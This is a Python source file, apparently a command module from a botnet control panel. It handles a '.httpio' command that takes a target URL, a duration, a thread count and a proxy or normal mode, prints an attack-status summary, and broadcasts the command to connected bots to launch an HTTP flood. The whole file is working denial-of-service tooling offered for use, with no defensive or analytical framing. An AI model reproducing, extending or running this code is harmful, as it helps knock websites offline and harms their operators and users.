import time
from colorama import Fore
bots = {}
def color(data_input_output):
    random_output = data_input_output
    if random_output == "GREEN":
        data = '\033[32m'
    elif random_output == "LIGHTGREEN_EX":
        data = '\033[92m'
    elif random_output == "YELLOW":
        data = '\033[33m'
    elif random_output == "LIGHTYELLOW_EX":
        data = '\033[93m'
    elif random_output == "CYAN":
        data = '\033[36m'
    elif random_output == "LIGHTCYAN_EX":
        data = '\033[96m'
    elif random_output == "BLUE":
        data = '\033[34m'
    elif random_output == "LIGHTBLUE_EX":
        data = '\033[94m'
    elif random_output == "MAGENTA":
        data = '\033[35m'
    elif random_output == "LIGHTMAGENTA_EX":
        data = '\033[95m'
    elif random_output == "RED":
        data = '\033[31m'
    elif random_output == "LIGHTRED_EX":
        data = '\033[91m'
    elif random_output == "BLACK":
        data = '\033[30m'
    elif random_output == "LIGHTBLACK_EX":
        data = '\033[90m'
    elif random_output == "WHITE":
        data = '\033[37m'
    elif random_output == "LIGHTWHITE_EX":
        data = '\033[97m'
    return data

lightwhite = color("LIGHTWHITE_EX")
gray = color("LIGHTBLACK_EX")
yellow = color("YELLOW")
def httpio(args, validate_time, send, client, ansi_clear, broadcast, data):
    
    maxThreads = 100 # Threads Limit (recommended 100 or 130)

    if len(args) == 5:
        url = args[1]
        secs = args[2]
        threadx = int(args[3])
        attackType = args[4]

        if validate_time(secs):
            if threadx <= maxThreads and threadx > 0:
                if attackType == 'PROXY' or attackType == 'NORMAL' or attackType == 'proxy' or attackType == 'normal':
                            send(client, f"{Fore.LIGHTWHITE_EX}Attack {Fore.CYAN}Status{Fore.LIGHTWHITE_EX}:")
                            send(client, f"{Fore.LIGHTWHITE_EX}Ur{Fore.CYAN}l{Fore.LIGHTWHITE_EX}: {Fore.CYAN}{url}")
                            send(client, f"{Fore.LIGHTWHITE_EX}Dura{Fore.CYAN}tion{Fore.LIGHTWHITE_EX}: {Fore.CYAN}{secs}")
                            send(client, f"{Fore.LIGHTWHITE_EX}Thre{Fore.CYAN}ads{Fore.LIGHTWHITE_EX}: {Fore.CYAN}{threadx}")
                            send(client, f"{Fore.LIGHTWHITE_EX}Attack{Fore.CYAN}Type{Fore.LIGHTWHITE_EX}: {Fore.CYAN}{attackType}")
                            send(client, f"{Fore.LIGHTWHITE_EX}Met{Fore.CYAN}hod{Fore.LIGHTWHITE_EX}: {Fore.CYAN}HTTPIO")
                            broadcast(data)
                else:
                    send(client, Fore.RED + '\nInvalid attack type (PROXY, NORMAL)\n')
            else:
              send(client, Fore.RED + '\nInvalid threads (1-100 threads)\n')  
        else:
            send(client, Fore.RED + '\nInvalid attack duration (1-1200 seconds)\n')
    else:
        send(client, f'\nUsage: .httpio [URL] [TIME] [THREADS] [PROXY, NORMAL]\n')
